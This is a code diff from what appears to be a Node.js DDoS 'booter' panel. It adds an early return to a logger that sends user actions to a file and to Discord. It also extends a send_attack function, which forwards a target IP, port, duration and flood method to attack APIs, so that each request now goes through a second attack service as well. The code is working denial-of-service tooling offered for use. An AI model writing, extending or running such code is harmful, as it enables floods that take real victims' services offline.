@@ -42,6 +42,7 @@ exports.log_action = async function(log_type, user, ip) {
     response += "[User]: " + user + " | [IP]: " + ip + "\r\n";
     response += "[Level]: " + info[3] + " | [Admin]: " + info[5] + "\r\n";
     response += "[Cmd]: " + eConfig.CurrentCmd.Cmd + " | [FullCmd]: " + eConfig.CurrentCmd.Fullcmd + "\r\n\r\n";
+    if(eConfig.CurrentCmd.Cmd === null || eConfig.CurrentCmd.Cmd === "undefined") return;
     console.log(response);
     eExtra.log_to_file(response);
     await eExtra.send_to_discord(response);
@@ -159,6 +160,10 @@ exports.send_attack = async function(ip, port, time, method, usr) {
     let rreturn = await(await fetch(Config.API_1 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
     console.log(rreturn);
     response += "API 1: " + await eExtra.get_api_response(rreturn) + "\r\n";
+
+    let rreturn1 = await(await fetch(Config.API_2 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
+    console.log(rreturn1);
+    response += "API 2: " + await eExtra.get_api_response(rreturn1) + "\r\n";
     return response;
 }
 
